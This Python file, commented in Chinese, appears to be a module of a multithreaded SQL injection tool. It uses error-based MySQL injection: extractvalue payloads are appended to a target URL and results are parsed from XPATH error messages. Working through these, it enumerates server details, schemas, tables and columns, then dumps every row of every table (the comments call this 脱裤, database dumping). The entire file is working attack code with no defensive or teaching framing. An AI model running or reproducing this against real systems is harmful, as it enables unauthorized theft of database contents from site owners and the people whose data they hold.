# -*- coding: utf-8 -*-
# -*- ver	: >=3.8.0 -*-
# -*- coder : CO0kie丶 -*-
# -*- time  : 20201120 -*-
import requests
import re
import pprint
from myhttp import HTTP

"""-----定义分隔符-----"""
Global_spilt = "!@Aa@!"
"""-----定义分隔符-----"""
pp = pprint.PrettyPrinter()


class InjError(HTTP):
    _url = None

    def Print(self, text):
        self._lock.acquire()
        print(f'>>{self._threadname} 报错脱裤：{text}')
        self._lock.release()
        pass

    def GetResult_ERROR_SUB(self, Sql_code, Left):
        """
        函数：分段获取数据库信息

        :param Sql_code: 注入点语句
        :param Left: 拼接的开始点
        :return: 拼接的字符串后段
        """

        # 构造注入点
        url0 = f"{self._url} and extractvalue(0,concat('~',substr((%s),%d,%d),'~'))--+"
        ret_str = ''
        while True:
            url = url0 % (Sql_code, Left, 32)

            # 测试链接，并得到返回长度
            content = requests.get(url=url)  # , headers=Global_Headers)
            body_len = int(content.headers['Content-Length']) \
                if 'Content-Length' in content.headers \
                else int(len(content.content))
            # print("\t【网页", content.status_code, body_len, f'\t【{url}】')
            # print(content.text.replace('\r\n', ''),
            #       end='\n】原文结束\n')
            if body_len == 0:
                break
            find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
            # print(">>re>>", find_list)
            for index, x in enumerate(find_list):
                if x[-1] == '~':  # 有闭合
                    ret_str += x[:-1]
                    return ret_str
                else:  # 无闭合，说明该字段被截断
                    ret_str += x
                    Left += len(ret_str)
        return None

    def GetResult_ERROR(self, Sql_code):
        """
        函数：执行SQL报错语句

        :param Sql_code: 处理的SQL语句
        :return: 返回查询结果
        """

        # 构造注入点
        url = f"{self._url} and extractvalue(0,concat('~',({Sql_code}),'~'))--+"

        # 测试链接，并得到返回长度
        content = requests.get(url=url)  # , headers=Global_Headers)
        body_len = int(content.headers['Content-Length']) \
            if 'Content-Length' in content.headers \
            else int(len(content.content))
        # print("\t【网页", content.status_code, body_len, f'\t【{url}】')
        # print(content.text.replace('\r\n', ''),
        #       end='\n】原文结束\n\n')
        if body_len == 0:
            return None

        # 返回正则表达式搜索结果
        find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
        for index, x in enumerate(find_list):
            if x[-1] == '~':  # 有闭合
                x = x[:-1]
            else:  # 无闭合，说明该字段被截断
                # print('>>>第一次读取结果', x)
                # x2 = GetResult_ERROR_SUB(Url, Sql_code, len(x))
                return x[:-1] + self.GetResult_ERROR_SUB(Sql_code, len(x))
            return int(x) if x.isdigit() else x
        return None
        pass

    def _db_init(self) -> bool:
        """
        函数：用于脱裤-系统数据库

        :return: T/F=返回是否脱裤成功
        """
        if self._url is None:
            return False

        self._db['系统数据库版本'] = self.GetResult_ERROR('@@VERSION')
        self._db['数据库文件权限'] = self.GetResult_ERROR('@@secure_file_priv')
        self._db['数据库安装路径'] = self.GetResult_ERROR('@@basedir')

        self._db['系统数据库索引'] = self.GetResult_ERROR(
            'SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata')
        self._db['系统数据库总数'] = self.GetResult_ERROR(
            'SELECT COUNT(*) FROM information_schema.schemata')
        self._db['系统表格总数'] = self.GetResult_ERROR(
            'SELECT COUNT(*) FROM information_schema.TABLES')

        self._db['本数据库名'] = self.GetResult_ERROR('database()')
        self._db['本表格总数'] = self.GetResult_ERROR(
            'SELECT count(*) FROM information_schema.STATISTICS '
            'WHERE TABLE_SCHEMA=database()')
        self._db['本表格索引'] = self.GetResult_ERROR(
            'SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.STATISTICS '
            'WHERE TABLE_SCHEMA=database()')

        # 判断是否有表格
        if len(self._db['本表格索引']) > 0:
            return self._db_table()
        return False
        pass

    def _db_table(self) -> bool:
        """
        函数：脱裤->数据库

        :return: T/F=成功脱裤
        """
        if self._url is None:
            return False
        for tb_name in self._db['本表格索引'].split(','):
            # 01 查询 表格列名
            columns = self.GetResult_ERROR(
                'SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS '
                f'WHERE TABLE_NAME = \'{tb_name}\' and TABLE_SCHEMA = DATABASE()'
            ).split(',')
            self._tbs[tb_name] = {'row_len': None, 'data': None}

            # 02 查询该表行数，并初始化二维列表
            row_max = self.GetResult_ERROR(
                f'SELECT COUNT(*) FROM {tb_name}')
            self._tbs[tb_name]['row_len'] = row_max
            self._tbs[tb_name]['data'] = [['行'] + columns]

            # 如果表行数为0 则下一次循环
            if row_max is None or row_max <= 0:
                continue
            lv_data = self._tbs[tb_name]['data']
            for i in range(row_max):
                lv_data.append([i + 1])

            # 03 查询该列的所有内容
            for column_name in columns:
                tb_datas = GetResult_ERROR_COLUMN(
                    self._url, tb_name, column_name,
                    GetResult_ERROR=self.GetResult_ERROR)

                # 04 如果返回空，则下一次循环
                if tb_datas is None:
                    continue
                else:
                    # self.Print(f'{tb_datas=}')
                    pass

                # 05 将值插入表
                for i in range(row_max):
                    data = tb_datas[i]
                    if data.isdigit():
                        data = int(data)
                    lv_data[i + 1].append(data)
                pass

            pass
        return len(self._tbs) > 0
        pass

    def __init__(self, Lock, Name: str, Info: dict):
        """
        构造函数：初始化联合注入类

        :param Lock: 线程锁
        :param Name: 线程名
        :param Info: 传入的信息字典
        """
        if '脱裤' in Info:
            return
        Info['脱裤'] = {'数据库': {}, '数据表': {}}
        Info['注入方式']['EXP'] = '基于报错注入'

        self._lock = Lock
        self._threadname = Name
        self._url = Info['注入方式']['基于报错注入']
        self._db = Info['脱裤']['数据库']
        self._tbs = Info['脱裤']['数据表']
        self._db_init()
        pass

    pass


def GetResult_ERROR_COLUMN(Url, Table, Column, Str_sp=Global_spilt, GetResult_ERROR=None):
    """
    函数：分段获取数据库信息

    :param Url: 注入点URL
    :param Table: 脱裤表名
    :param Column: 脱裤列名
    :param Str_sp: 用于分割爆破的字符串，默认为'!@a@!0'
    :param GetResult_ERROR: 用于查找的函数指针
    :return: 拼接的字符串
    """

    # 构造注入语句
    url0 = f"{Url} and extractvalue(0,concat('~',substr((%s),%d),'~'))--+"
    sql_code = f'SELECT GROUP_CONCAT({Column} SEPARATOR \'{Str_sp}\')as DT FROM {Table}'
    ret_str = ''

    # 构造返回值的长度
    ret_max = GetResult_ERROR(f'SELECT LENGTH(DT) FROM({sql_code})A')

    i = 1
    while len(ret_str) < ret_max:
        # 格式化注入url
        url = url0 % (sql_code, i)

        # 注入，并得到返回长度
        content = requests.get(url=url)  # , headers=Global_Headers)
        body_len = int(content.headers['Content-Length']) \
            if 'Content-Length' in content.headers \
            else int(len(content.content))
        if body_len < 1:
            return ''
        # print("\t【网页", content.status_code, body_len, f'\t【{url}】')
        # print(content.text.replace('\r\n', ''),
        #       end='\n】原文结束\n')

        find_list = re.findall("XPATH syntax error: \'~(.*?)\'", content.text)
        for find_data in find_list:
            ret_str += find_data
            i += len(find_data)
            # print(i, ret_max, find_data, ret_str)
            if i > ret_max:
                return ret_str[:-1].split(Str_sp)
    return None
    pass
